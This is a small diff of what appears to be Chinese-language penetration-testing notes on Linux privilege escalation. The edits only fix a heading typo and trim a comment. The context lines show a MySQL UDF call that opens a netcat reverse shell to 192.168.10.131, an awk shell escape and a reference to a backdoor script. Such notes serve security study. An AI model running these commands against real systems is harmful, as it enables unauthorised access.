@@ -209,7 +209,7 @@ create function do_system returns integer soname 'udf.so';
 select do_system('nc 192.168.10.131 6666 -e /bin/bash');
 ```
 
-## 利用 Capability 提取
+## 利用 Capability 提权
 
 > https://www.cnblogs.com/f-carey/p/16026088.html
 
@@ -439,7 +439,7 @@ chmod +x /host/tmp/backdoor.sh
 	- 其他 Shell 启动 (sh/bash -i)
 
 ```bash
-# AWK 绕过（你的案例）
+# AWK 绕过
 awk 'BEGIN {system("/bin/bash")}'
 
 # Python 绕过
